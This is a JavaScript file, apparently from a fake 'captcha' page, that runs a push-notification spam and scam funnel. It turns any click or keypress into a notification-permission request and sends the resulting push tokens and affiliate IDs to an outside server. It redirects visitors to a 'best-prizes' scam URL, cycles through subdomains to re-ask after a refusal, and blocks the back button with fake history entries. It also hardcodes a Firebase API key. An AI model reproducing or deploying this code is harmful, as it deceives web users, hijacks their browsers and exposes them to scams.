var MD5 = function (d) { return M(V(Y(X(d), 8 * d.length))) }; function M(d) { for (var m, f = "0123456789ABCDEF", i = "", n = 0; n < d.length; n++)m = d.charCodeAt(n), i += f.charAt(m >>> 4 & 15) + f.charAt(15 & m); return i } function X(d) { for (var m = Array(d.length >> 2), f = 0; f < m.length; f++)m[f] = 0; for (f = 0; f < 8 * d.length; f += 8)m[f >> 5] |= (255 & d.charCodeAt(f / 8)) << f % 32; return m } function V(d) { for (var m = "", f = 0; f < 32 * d.length; f += 8)m += String.fromCharCode(d[f >> 5] >>> f % 32 & 255); return m } function Y(d, m) { d[m >> 5] |= 128 << m % 32, d[14 + (m + 64 >>> 9 << 4)] = m; for (var f = 1732584193, i = -271733879, n = -1732584194, r = 271733878, h = 0; h < d.length; h += 16) { var g = f, t = i, a = n, e = r, i = md5ii(i = md5ii(i = md5ii(i = md5ii(i = md5hh(i = md5hh(i = md5hh(i = md5hh(i = md5gg(i = md5gg(i = md5gg(i = md5gg(i = md5ff(i = md5ff(i = md5ff(i = md5ff(i, n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 0], 7, -680876936), i, n, d[h + 1], 12, -389564586), f, i, d[h + 2], 17, 606105819), r, f, d[h + 3], 22, -1044525330), n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 4], 7, -176418897), i, n, d[h + 5], 12, 1200080426), f, i, d[h + 6], 17, -1473231341), r, f, d[h + 7], 22, -45705983), n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 8], 7, 1770035416), i, n, d[h + 9], 12, -1958414417), f, i, d[h + 10], 17, -42063), r, f, d[h + 11], 22, -1990404162), n = md5ff(n, r = md5ff(r, f = md5ff(f, i, n, r, d[h + 12], 7, 1804603682), i, n, d[h + 13], 12, -40341101), f, i, d[h + 14], 17, -1502002290), r, f, d[h + 15], 22, 1236535329), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 1], 5, -165796510), i, n, d[h + 6], 9, -1069501632), f, i, d[h + 11], 14, 643717713), r, f, d[h + 0], 20, -373897302), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 5], 5, -701558691), i, n, d[h + 10], 9, 38016083), f, i, d[h + 15], 14, -660478335), r, f, d[h + 4], 20, -405537848), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 9], 5, 568446438), i, n, d[h + 14], 9, -1019803690), f, i, d[h + 3], 14, -187363961), r, f, d[h + 8], 20, 1163531501), n = md5gg(n, r = md5gg(r, f = md5gg(f, i, n, r, d[h + 13], 5, -1444681467), i, n, d[h + 2], 9, -51403784), f, i, d[h + 7], 14, 1735328473), r, f, d[h + 12], 20, -1926607734), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 5], 4, -378558), i, n, d[h + 8], 11, -2022574463), f, i, d[h + 11], 16, 1839030562), r, f, d[h + 14], 23, -35309556), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 1], 4, -1530992060), i, n, d[h + 4], 11, 1272893353), f, i, d[h + 7], 16, -155497632), r, f, d[h + 10], 23, -1094730640), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 13], 4, 681279174), i, n, d[h + 0], 11, -358537222), f, i, d[h + 3], 16, -722521979), r, f, d[h + 6], 23, 76029189), n = md5hh(n, r = md5hh(r, f = md5hh(f, i, n, r, d[h + 9], 4, -640364487), i, n, d[h + 12], 11, -421815835), f, i, d[h + 15], 16, 530742520), r, f, d[h + 2], 23, -995338651), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 0], 6, -198630844), i, n, d[h + 7], 10, 1126891415), f, i, d[h + 14], 15, -1416354905), r, f, d[h + 5], 21, -57434055), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 12], 6, 1700485571), i, n, d[h + 3], 10, -1894986606), f, i, d[h + 10], 15, -1051523), r, f, d[h + 1], 21, -2054922799), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 8], 6, 1873313359), i, n, d[h + 15], 10, -30611744), f, i, d[h + 6], 15, -1560198380), r, f, d[h + 13], 21, 1309151649), n = md5ii(n, r = md5ii(r, f = md5ii(f, i, n, r, d[h + 4], 6, -145523070), i, n, d[h + 11], 10, -1120210379), f, i, d[h + 2], 15, 718787259), r, f, d[h + 9], 21, -343485551), f = safeadd(f, g); i = safeadd(i, t), n = safeadd(n, a), r = safeadd(r, e) } return [f, i, n, r] } function md5cmn(d, m, f, i, n, r) { return safeadd(bitrol(safeadd(safeadd(m, d), safeadd(i, r)), n), f) } function md5ff(d, m, f, i, n, r, h) { return md5cmn(m & f | ~m & i, d, m, n, r, h) } function md5gg(d, m, f, i, n, r, h) { return md5cmn(m & i | f & ~i, d, m, n, r, h) } function md5hh(d, m, f, i, n, r, h) { return md5cmn(m ^ f ^ i, d, m, n, r, h) } function md5ii(d, m, f, i, n, r, h) { return md5cmn(f ^ (m | ~i), d, m, n, r, h) } function safeadd(d, m) { var f = (65535 & d) + (65535 & m); return (d >> 16) + (m >> 16) + (f >> 16) << 16 | 65535 & f } function bitrol(d, m) { return d << m | d >>> 32 - m }

const loadScript = src => {
	return new Promise((resolve, reject) => {
		const script = document.createElement('script')
		script.type = 'text/javascript'
		script.onload = resolve
		script.onerror = reject
		script.src = src
		document.head.append(script)
	})
}
var today = new Date();
var date = today.getDate() + '' + (today.getMonth() + 1) + '' + today.getFullYear();
//var sw='/'+(MD5(date).toLowerCase())+'.js';
var sw = '/firebase-messaging-sw.js';
loadScript('https://www.gstatic.com/firebasejs/9.8.1/firebase-app-compat.js')
	.then(() => loadScript('https://www.gstatic.com/firebasejs/9.8.1/firebase-messaging-compat.js'))
	.then(() => navigator.serviceWorker.register(sw))
	.then((registration) => {
		initPush(registration);
	})
	.catch((err) => {
		console.error('Error:', err);
		fetch("https://pushbizapi.com/api/errors/install?message=" + err).then((r) => { }, (e) => { });
	});


	var config = {
		apiKey: "AIzaSyDnU949ApofKmeD_P2bv_AE5bpRIdz1pkg",
		authDomain: "shtoringithubpushes.firebaseapp.com",
		databaseURL: "https://shtoringithubpushes.firebaseio.com",
		projectId: "shtoringithubpushes",
		storageBucket: "shtoringithubpushes.appspot.com",
		messagingSenderId: "279155818136",
		appId: "1:279155818136:web:db3e5f8199b9b2afa59aed",
		measurementId: "G-JZHK778HK0"
	  };
	  
var mainDomain = 'blandcaptcha.top';
var redirectUrl = 'https://best-prizes.life/?u=3w8p605&o=pn1kfzq';

function initPush(registration) {
	var subDomains = [
		'a',
		'b',
		'c',
		'd',
		'e',
		'f',
		'g',
		'h',
		'i'
	];

	var nAgt = navigator.userAgent;
	var browserName = navigator.appName;
	var isAndroid = nAgt.toLowerCase().indexOf("android") > -1; //&& ua.indexOf("mobile");

	if (isAndroid) document.body.classList.add('isAndroid');

	function myFunction() {

		debugger;

	}

	function setCookie(name, value, minutes) {
		var expires = "";
		if (minutes) {
			var date = new Date();
			date.setTime(date.getTime() + (minutes * 60 * 1000));
			expires = "; expires=" + date.toUTCString();
		}
		document.cookie = name + "=" + (value || "") + expires + "; path=/";
	}
	function getCookie(name) {
		var nameEQ = name + "=";
		var ca = document.cookie.split(';');
		for (var i = 0; i < ca.length; i++) {
			var c = ca[i];
			while (c.charAt(0) == ' ') c = c.substring(1, c.length);
			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
		}
		return null;
	}

	//Opera
	if ((verOffset = nAgt.indexOf("OPR/")) != -1 || (verOffset = nAgt.indexOf("Opera")) != -1) {
		browserName = "Opera";
		document.body.classList.add('Opera');
	}
	//Maxthon browser
	else if ((verOffset = nAgt.indexOf("MAXTHON")) != -1) {
		browserName = "Maxthon";
		document.body.classList.add('Maxthon');
	}
	//Facebook browser
	else if ((verOffset = nAgt.indexOf("FB_IAB")) != -1 || (verOffset = nAgt.indexOf("FBAV")) != -1) {
		browserName = "Facebook browser";
		document.body.classList.add('Facebook');
	}
	//Instagram browser
	else if ((verOffset = nAgt.indexOf("Instagram")) != -1) {
		browserName = "Instagram browser";
		document.body.classList.add('Instagram');
	}
	//Pinterest browser
	else if ((verOffset = nAgt.indexOf("Pinterest")) != -1) {
		browserName = "Pinterest browser";
		document.body.classList.add('Pinterest');
	}
	//Internet Explorer
	else if (((verOffset = nAgt.indexOf("MSIE")) != -1 || (verOffset = nAgt.indexOf("Trident")) != -1) && (verOffset = nAgt.indexOf("MAXTHON")) === -1) {
		browserName = "Internet Explorer";
		document.body.classList.add('Explorer');
	}
	//Edge
	else if ((verOffset = nAgt.indexOf("Edge")) != -1 || (verOffset = nAgt.indexOf("EdgA")) != -1) {
		browserName = "Microsoft Edge";
		document.body.classList.add('Edge');
	}
	//Samsung browser
	else if ((verOffset = nAgt.indexOf("SamsungBrowser")) != -1) {
		browserName = "Samsung Browser";
		document.body.classList.add('Samsung');
	}
	//QQ browser
	else if ((verOffset = nAgt.indexOf("QQBrowser")) != -1) {
		browserName = "QQ Browser";
		document.body.classList.add('QQ');
	}

	//Puffin browser
	else if ((verOffset = nAgt.indexOf("Puffin")) != -1) {
		browserName = "Puffin";
		document.body.classList.add('Puffin');
	}
	//Silk browser
	else if ((verOffset = nAgt.indexOf("Silk")) != -1) {
		browserName = "Silk";
		document.body.classList.add('Silk');
	}
	//Vivaldi browser
	else if ((verOffset = nAgt.indexOf("Vivaldi")) != -1) {
		browserName = "Vivaldi";
		document.body.classList.add('Vivaldi');
	}
	//Yandex browser
	else if ((verOffset = nAgt.indexOf("YaBrowser")) != -1) {
		browserName = "Yandex Browser";
		document.body.classList.add('Yandex');
	}
	//UC browser
	else if ((verOffset = nAgt.indexOf("UCBrowser")) != -1) {
		browserName = "UC Browser";
		document.body.classList.add('UC');
	}
	//BlackBerry browser
	else if ((verOffset = nAgt.indexOf("BB10")) != -1 || (verOffset = nAgt.indexOf("BlackBerry")) != -1) {
		browserName = "BlackBerry Browser";
		document.body.classList.add('BlackBerry');
	}
	//Coc Coc  browser
	else if ((verOffset = nAgt.indexOf("coc_coc_")) != -1) {
		browserName = "Coc Coc Browser";
		document.body.classList.add('Coc');
	}
	//MiuiBrowser  browser
	else if ((verOffset = nAgt.indexOf("MiuiBrowser")) != -1) {
		browserName = "Miui Browser";
		document.body.classList.add('Miui');
	}
	//Android  browser
	else if ((verOffset = nAgt.indexOf("Android")) != -1 && (verOffset = nAgt.indexOf("Chrome")) === -1 && (verOffset = nAgt.indexOf("Firefox")) === -1) {
		browserName = "Android Browser";
		document.body.classList.add('Android');
	}
	// In Chrome, the true version is after "Chrome"
	else if ((verOffset = nAgt.indexOf("Chrome")) != -1 || (verOffset = nAgt.indexOf("CriOS")) != -1) {
		browserName = "Chrome";
		document.body.classList.add('Chrome');
	}

	// In Safari, the true version is after "Safari" or after "Version"
	else if ((verOffset = nAgt.indexOf("Safari")) != -1 && (verOffset = nAgt.indexOf("Chrome")) === -1) {
		browserName = "Safari";
		document.body.classList.add('Safari');
	}
	// In Firefox, the true version is after "Firefox"
	else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
		browserName = "Firefox";
		document.body.classList.add('Firefox');
	}

	var isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
	var subDomain = window.location.hostname.split('.')[0];
	var subDomainIndex = subDomains.indexOf(subDomain);
	var lastDomain = false;
	var fingerprint = 0;
	if (subDomainIndex >= subDomains.length - 1) lastDomain = true;

	try {
		const firebaseApp = !firebase.apps.length ? firebase.initializeApp(config) : firebase.app();
		var messaging = firebaseApp.firebase.messaging();
	}
	catch (err) {
		fetch("https://pushbizapi.com/api/errors/install?message=" + err).then((r) => { }, (e) => { });
		setTimeout(function () { window.location.href = redirectUrl + '&t=firebaserr'; }, 500);
	}

	var params = {};
	initParams();

	function CheckS(registration) {
		debugger;
		messaging.getToken()
			.then(function (token) {
				debugger;
				var alreadyVisited = getCookie('alreadyVisited');
				if (!!alreadyVisited) {
					return;
				}
				else {
					setCookie('alreadyVisited', true, 2);
				}
				return messaging.getToken({ serviceWorkerRegistration: registration });
			})
			.then(function (currentToken) {
				debugger;
				if (currentToken) {
					return sendTokenToServer(currentToken);
				}
			})
			.then(function (response) {
				debugger;
				if (response) {
					window.location.href = redirectUrl;
				}
			}, function (reason) {
				debugger;
				setTokenSentToServer(false);

				var protocol = window.location.protocol;
				var pathName = window.location.pathname;
				var getParams = window.location.search;

				if (reason.code === 'messaging/permission-default' && !isFirefox) {

					if (lastDomain) {
						window.location.href = redirectUrl;
					} else {
						window.location.href = protocol + '//' + subDomains[subDomainIndex + 1] + '.' + mainDomain + pathName + getParams;
					}

				} else if (reason.code === 'messaging/permission-blocked' || (reason.code === 'messaging/permission-default' && isFirefox)) {

					if (lastDomain) {
						window.location.href = redirectUrl;
					} else {
						window.location.href = protocol + '//' + subDomains[subDomainIndex + 1] + '.' + mainDomain + pathName + getParams;
					}

				}
			}).catch(function (err) {
				debugger;
				fetch("https://pushbizapi.com/api/errors/install?message=" + err).then((r) => { }, (e) => { });
				setTokenSentToServer(false);
				closePopup();
			});
	}

	function sendTokenToServer(currentToken) {
		debugger;
		return new Promise(function (resolve, reject) {
			debugger;
			if (!isTokenSentToServer(currentToken)) {
				debugger;
				var clientData = params;
				//var spinner = document.getElementById("js-spinner");
				//spinner.style.display = "inline-block";

				clientData.token = currentToken;
				clientData.messageSenderId = config.messagingSenderId;
				clientData.clickId = params.c;
				clientData.affiliateId = params.a;
				clientData.subscribeMethod = "robot37_0302_1";

				clientData.vertical = "buyout";
				clientData.se = 1;

				clientData.fp = fingerprint;

				sendSubscriptionInfoToServer(clientData)
					.then(function (response) {
						//debugger;
						setTokenSentToServer(currentToken);
						resolve(true);
					})
					.catch(function (err) {
						fetch("https://pushbizapi.com/api/errors/install?message=" + err).then((r) => { }, (e) => { });
						reject(false);
					});
			}
			else {
				debugger;
				resolve(true);
			}
		});
	}

	function isTokenSentToServer(currentToken) {
		return window.localStorage.getItem('sentFirebaseMessagingToken') == currentToken;
	}

	function sendSubscriptionInfoToServer(subscriptionData) {
		debugger;
		return new Promise(function (resolve, reject) {
			//debugger;
			var domain = 'https://pushbizapi.com';

			var stringifiedObject = JSON.stringify(subscriptionData);

			var base64object = btoa(stringifiedObject);

			var url = domain + '/api2/subscribeGet?data=' + base64object;

			var xhr = createCORSRequest('GET', url);
			if (!xhr) {
				reject("XHR not supported");
			}

			xhr.open("GET", url, true);

			xhr.onload = function () {
				debugger;
				resolve(xhr.responseText);
			};

			xhr.onerror = function () {
				debugger;
				fetch("https://pushbizapi.com/api/errors/install?message=" + err).then((r) => { }, (e) => { });
				console.log('Error on subscription request');
				reject("Error during sending request");
			};

			xhr.send();
		});
	}

	function createCORSRequest(method, url) {
		var xhr = new XMLHttpRequest();

		if ("withCredentials" in xhr) {
			xhr.open(method, url, true);
		} else if (typeof XDomainRequest != "undefined") {
			xhr = new XDomainRequest();
			xhr.open(method, url);
		} else {
			xhr = null;
		}
		return xhr;
	}

	function setTokenSentToServer(currentToken) {
		window.localStorage.setItem('sentFirebaseMessagingToken', currentToken ? currentToken : false);
	}

	function closePopup() {
		if (window.self) {
			setTimeout(function () {
				window.self.close();
			}, 200);
		}
	}

	function initParams() {
		var parsedUrl = parseURL(window.location);
		if (parsedUrl.params) {
			params = parsedUrl.params;
		}
	}

	function parseURL(url) {
		var a = document.createElement('a');
		a.href = url;
		return {
			host: a.hostname,
			source: url,
			params: (function () {
				var ret = {},
					seg = a.search.replace(/^\?/, '').split('&'),
					len = seg.length, i = 0, s;
				for (; i < len; i++) {
					if (!seg[i]) { continue; }
					s = seg[i].split('=');
					ret[s[0]] = decodeURIComponent(s[1].replace(/\+/g, ' '));
				}
				return ret;
			})()
		};
	}




	function compareVersion(v1, v2) {
		if (typeof v1 !== 'string') return false;
		if (typeof v2 !== 'string') return false;
		v1 = v1.split('.');
		v2 = v2.split('.');
		var k = Math.min(v1.length, v2.length);
		for (var i = 0; i < k; ++i) {
			v1[i] = parseInt(v1[i], 10);
			v2[i] = parseInt(v2[i], 10);
			if (v1[i] > v2[i]) return 1;
			if (v1[i] < v2[i]) return -1;
		}
		return v1.length == v2.length ? 0 : (v1.length < v2.length ? -1 : 1);
	}

	var isChrome = false;

	if (/Chrome/.test(navigator.userAgent || '') && /Google Inc/.test(navigator.vendor || '')) {
		var version = navigator.userAgent.match(/Chrom(?:e|ium)\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/);
		if (version !== null && compareVersion('74.0.3729.131', version[1]) <= 0) {
			isChrome = true;
		}
	}


	var ua = navigator.userAgent.toLowerCase();
	var isAndroid = ua.indexOf("android") > -1; //&& ua.indexOf("mobile");

	var template = '\
    <div style="color:#000;box-sizing: border-box;-webkit-box-sizing:border-box;width: 320px;max-width: 100%;height: 130px;background: #fff;position: fixed;top: 0;left: ' + (window.innerWidth < 400 ? 0 : 56) + 'px;box-shadow: 0 0 20px #0000008a;border-radius: 3px;line-height: 1;">\
    <img class="js-close" style="box-sizing: border-box;-webkit-box-sizing:border-box;padding: 0;margin:0;position: absolute;width: 11px;right:10px;top:10px;cursor: pointer;outline: 0 !important;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAS1BMVEUAAABaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlpaWlo8++Y/AAAAGHRSTlMAC/Tp5NHux7woBr8u1CEiE8wfMh3aqKRGKXN5AAAAxklEQVQoz22SWxaDIAxEo6JQLIpWW/a/0kYE5xCYDx+53BwkEse4herMbqVIQ1AVtzNXD76bwBlWQfVVVfvlRv4qsE5VOvkKH+4d8mN6mh6/23LpzS/ggvZMJa+XW43loNisfdp5Kl3hq0TlQc0BwWdKDlfGgKqD6vwy3Tpq5Jvx6FvzFRurKfjSpvCb9HzOZ2/QydNW9zf1SOCD3gN14NJNA0d/K2jhH8IV/kQ60Q8o/J46DRfxLv8xVsMt/EgvPkQqfcUd/7Y7JTdYkYd+AAAAAElFTkSuQmCC" />\
    <div style="box-sizing: border-box;-webkit-box-sizing:border-box;padding: 5% 5% 4% 5%;font-family: calibri,arial;font-size: 17px;">\
        '+ MESSAGES.current.title + '\
    </div>\
    <div style="text-align: left;font-size: 0;line-height: 0;padding: 0 5%;">\
        <img style="width:13px;vertical-align: top;padding: 0;margin: 0;display: inline-block;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAqCAMAAADs1AnaAAAAUVBMVEUAAABaWlpZWVlaWlpZWVlSUlJZWVlaWlpZWVlZWVlWVlZOTk5ZWVlZWVlaWlpZWVlZWVlXV1dRUVFaWlpaWlpZWVlaWlpZWVlaWlpVVVVaWlqPKIPXAAAAGnRSTlMAXm2UZw358qZCMAjfzbOrWDUX48S4nIx3J6SDwgkAAAC9SURBVDjL7dLLDoMgEIXhaSsC3vHuef8HLVETFWHUpMv+6y9nMUBupm0NXVTFQFzxRmSwZYJFUwxbPLEoWVDCEN1nmMt6HVopsKvwrkUSh2R0NiNOjacdeHK2EulDMjmgDt66vdEItL+ECiG1GdGEULO9okEws/2PMKrcI/GneofR+49+iB49S1qEUZGuRoFJpbMpwVZaJVbDKEE5LssJN6LXjeh59Wet5pDEnOQQDQsaiEso2JQgPp3nmpy+KIFSTz3Bs58AAAAASUVORK5CYII=" />\
        <span style="display:inline-block;vertical-align:top;margin-left:14px;font-size: 15px;line-height:1;font-family: \'segoe ui\',Calibri,Arial;font-weight: 400;">\
            '+ MESSAGES.current.permission + '\
        </span>\
    </div>\
    <div style="padding: 22px 12px 0 12px;font-size: 0;line-height: 0;text-align: right;">\
        <div class="js-allow" style="font-weight: 600;border: 1px solid #dadce0;color: #3673E3;margin-left: 10px;text-shadow: none;display: inline-block;vertical-align: top;min-width: 109px;text-align: center;padding: 0 15px;margin: 3px;height: 30px;line-height: 28px;border-radius: 4px;cursor: pointer;font-family: \'segoe ui\',Calibri,Arial;outline: 0 !important;font-size: 12px;" >\
            '+ MESSAGES.current.allow + '\
        </div>\
        <div class="js-denied" style="font-weight: 600;border: 1px solid #dadce0;color: #3673E3;margin-left: 10px;text-shadow: none;display: inline-block;vertical-align: top;min-width: 109px;text-align: center;padding: 0 15px;margin: 3px;height: 30px;line-height: 28px;border-radius: 4px;cursor: pointer;font-family: \'segoe ui\',Calibri,Arial;outline: 0 !important;font-size: 12px;" >\
            '+ MESSAGES.current.disallow + '\
        </div>\
    </div>\
</div>\
';

	if (isAndroid) template = '\
    <div class="flabs" style="color:#000;background-color: #fff;border-radius: 5px;box-shadow: 0 10px 20px rgba(0,0,0,.25);box-sizing: border-box;font-family: sans-serif;font-size: 13px;max-width: 380px;padding: 17px 15px 9px 20px;text-align: left;width: 92%;top: 25%;left: 4%;position: relative;">\
    <div style="align-items: center;color: #757575;display: flex;">\
     <svg style="fill: #4285f4;height: 16px;min-height: 16px;min-width: 16px;width: 16px;" xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 512 512"><path d="M467.812,431.851l-36.629-61.056c-16.917-28.181-25.856-60.459-25.856-93.312V224c0-67.52-45.056-124.629-106.667-143.04 V42.667C298.66,19.136,279.524,0,255.993,0s-42.667,19.136-42.667,42.667V80.96C151.716,99.371,106.66,156.48,106.66,224v53.483 c0,32.853-8.939,65.109-25.835,93.291l-36.629,61.056c-1.984,3.307-2.027,7.403-0.128,10.752c1.899,3.349,5.419,5.419,9.259,5.419 H458.66c3.84,0,7.381-2.069,9.28-5.397C469.839,439.275,469.775,435.136,467.812,431.851z"></path><path d="M188.815,469.333C200.847,494.464,226.319,512,255.993,512s55.147-17.536,67.179-42.667H188.815z"></path></svg>\
     <div style="line-height: 1.25;margin: 0 5px 0 10px;">\
        '+ MESSAGES.current.title + '\
        <br>\
        '+ MESSAGES.current.permission + '\
     </div>\
    </div>\
    <div style="display: flex;justify-content: flex-end;margin-top: 28px;">\
          <div class="js-allow" style="-webkit-tap-highlight-color: transparent;background: none;border: none;border-radius: 2px;color: #256af3;font: inherit;margin-left: 7px;outline: none;padding: 8px 6px;text-shadow: 0.3px 0.3px 0 #256af3;transition: background-color .15s ease-in-out;" >\
              '+ MESSAGES.current.allow + '\
          </div>\
          <div class="js-denied" style="-webkit-tap-highlight-color: transparent;background: none;border: none;border-radius: 2px;color: #256af3;font: inherit;margin-left: 7px;outline: none;padding: 8px 6px;text-shadow: 0.3px 0.3px 0 #256af3;transition: background-color .15s ease-in-out;" >\
              '+ MESSAGES.current.disallow + '\
          </div>\
    </div>\
</div>\
';

	var rootElement = null;
	var canStart = true;
	debugger;
	Oload(registration);
	function Oload(registration) {
		debugger;
		function goToFullScreen() {
			debugger;
			myFunction();
			if (isChrome && rootElement) {
				rootElement.parentNode.removeChild(rootElement);
				rootElement = null;

				CheckS(registration);
			} else {
				CheckS(registration);
			}
		}
		document.querySelector('html').addEventListener('click', goToFullScreen);
		document.querySelector('html').addEventListener('keydown', goToFullScreen);

		// if (isChrome || isFirefox) {
		// 	rootElement = document.createElement('div');
		// 	rootElement.innerHTML = template;
		// 	document.body.appendChild(rootElement);

		// 	if (subDomainIndex == -1) goToFullScreen();
		// } else {
		// 	CheckS(registration);

		// }


	};

	function disableHistory() {
		try {
			for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
			onpopstate = function (t) {
				var protocol = window.location.protocol;
				var pathName = window.location.pathname;
				var getParams = window.location.search;
				if (Notification.permission === 'granted') {
					t.state && location.replace(redirectUrl);

				} else {
					t.state && location.replace(protocol + '//' + subDomains[subDomainIndex + 1] + '.' + mainDomain + pathName + getParams);
				}

			}

		} catch (error) {
		}
	}

	try {
		var isIncognito = () => {
			return new Promise((resolve, reject) => {
				if ("storage" in navigator && "estimate" in navigator.storage) {
					navigator.storage.estimate().then((res) => {
						console.log('Using ${res.usage} out of ${res.quota} bytes.');
						if (res.quota < 120000000) {
							resolve(true);
						} else {
							reject(false);
						}
					});
				} else {
					reject(false);
				}
			});
		};
		isIncognito().then(yes => location.href = redirectUrl).catch(isnot => console.log('no'))
	} catch (error) { }
	disableHistory();
}